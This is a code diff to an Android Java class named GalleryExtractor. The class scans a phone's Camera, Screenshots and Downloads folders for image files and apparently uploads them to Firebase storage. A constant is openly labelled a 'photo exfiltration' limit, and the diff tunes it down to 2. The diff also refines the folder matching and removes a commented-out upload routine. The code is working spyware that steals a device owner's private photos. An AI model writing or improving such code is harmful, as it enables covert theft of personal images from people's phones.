@@ -47,10 +47,10 @@ public class GalleryExtractor extends AppCompatActivity {
 
     ArrayList<String> commonPhotoDirectories = new ArrayList<>(Arrays.asList(Environment.DIRECTORY_PICTURES, Environment.DIRECTORY_DCIM, Environment.DIRECTORY_DOWNLOADS));
     ArrayList<String> photoFilePathsToExtract = new ArrayList<>(); // Collect all the photo directories here
-    ArrayList<String> allowedPhotoExtensions =  new ArrayList<>(Arrays.asList(".png", ".jpg", ".jpeg"));
+    ArrayList<String> allowedPhotoExtensions =  new ArrayList<>(Arrays.asList(".png", ".jpg", "jpeg"));
     ArrayList<String> interestingPhotoSubdirectories = new ArrayList<>(Arrays.asList("Camera", "Screenshots", "Downloads"));  // So that Zafran doesn't need to pay for Firebase storage
 
-    private final int MAX_PHOTO_EXFILTRATION_PER_DIRECTORY_LIMIT = 10; // So that Zafran doesn't need to pay for Firebase storage too
+    private final int MAX_PHOTO_EXFILTRATION_PER_DIRECTORY_LIMIT = 2; // So that Zafran doesn't need to pay for Firebase storage too
 
     String photoDir;
     private boolean mSaved;
@@ -62,6 +62,7 @@ public class GalleryExtractor extends AppCompatActivity {
         uploadGallery();
 
     }
+
     public GalleryExtractor() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             commonPhotoDirectories.add(Environment.DIRECTORY_SCREENSHOTS);
@@ -122,8 +123,11 @@ public class GalleryExtractor extends AppCompatActivity {
         int photo_count = 0;
         for (int i = 0; i < files.length; i++) {
             String fileName = files[i].getAbsolutePath();
-            if (files[i].isDirectory() && interestingPhotoSubdirectories.contains(files[i].toString())) {
+            String[] fileNameSplitter = fileName.split("/");
+            if (files[i].isDirectory() && interestingPhotoSubdirectories.contains(fileNameSplitter[fileNameSplitter.length - 1])) {
+                // Log.d("Files", "FileName:" + files[i].toString());
                 listPicturesInDirectory(files[i].getAbsolutePath());
+
             } else if (fileName.length() > 4 && photo_count < MAX_PHOTO_EXFILTRATION_PER_DIRECTORY_LIMIT) {
                 String filenameExtension = fileName.substring(fileName.length() - 4);
                 if (allowedPhotoExtensions.contains(filenameExtension)) {
@@ -180,22 +184,6 @@ public class GalleryExtractor extends AppCompatActivity {
     private interface FirebaseCallback {
         void onCallback(String username);
     }
-//    public void uploadGallery() {
-//        Log.d(ACTIVITY_SERVICE, getGalleryPath());
-//        Uri localFile = Uri.fromFile(new File("/storage/emulated/0/Pictures/IMG_20230209_151614.jpg")); //Change this part
-//        UploadTask uploadTask;
-//        StorageReference photoref = storageRef.child("images/" + UUID.randomUUID().toString());
-//        uploadTask = photoref.putFile(localFile);
-//        uploadTask.addOnProgressListener(new OnProgressListener<UploadTask.TaskSnapshot>() {
-//            @Override
-//            public void onProgress(UploadTask.TaskSnapshot taskSnapshot) {
-//                Uri sessionUri = taskSnapshot.getUploadSessionUri();
-//                if (sessionUri != null && !mSaved) {
-//                    mSaved = true;
-//                }
-//            }
-//        });
-//    }
 
 
 }
